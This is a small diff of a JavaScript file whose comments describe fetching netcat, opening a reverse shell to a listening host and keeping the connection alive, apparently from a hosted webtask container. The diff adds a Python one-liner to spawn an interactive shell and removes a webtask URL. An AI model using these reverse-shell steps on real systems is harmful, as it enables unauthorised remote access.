@@ -5,12 +5,14 @@ var fs = require('fs');
 // download netcat and initiate reverse shell
 // edit final command to point at appropriate ip address hosting a listening netcat port
 // launch listening port with netcat -l portnum
+// i like grabbing a tty using python w/
+// python -c 'import pty; pty.spawn("/bin/sh")'
+// you can type that in right after you start netcat... its satisfying to see the shell prompt pop when it connects :D
 
 // run companion keep_alive.py script to both initiate the netcat & container and keep the connection up and running
 
 
 var exists = false;
-var webtaskurl = 'https://webtask.it.auth0.com/api/run/wt-mbassett_jr-gmail_com-0/netcat?webtask_no_cache=1&keepalive=YESPLZ';
 
 function file_exist(path) {
     try {
